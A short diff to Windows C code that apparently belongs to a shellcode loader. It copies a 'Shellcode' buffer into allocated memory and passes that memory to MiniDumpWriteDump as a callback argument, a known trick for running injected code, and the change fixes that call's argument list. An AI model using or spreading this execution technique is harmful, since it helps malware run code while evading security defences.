@@ -33,7 +33,7 @@ INT wmain(INT argc, WCHAR* argv[])
 	memcpy(hAlloc, Shellcode, SCLen);
 
 	MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(), NULL,
-		MiniDumpNormal, NULL, NULL, (PMINIDUMP_USER_STREAM_INFORMATION)&hAlloc, NULL);
+		MiniDumpNormal, NULL, NULL, (PMINIDUMP_USER_STREAM_INFORMATION)&hAlloc);
 
 CLEANUP:
 	if (Shellcode)
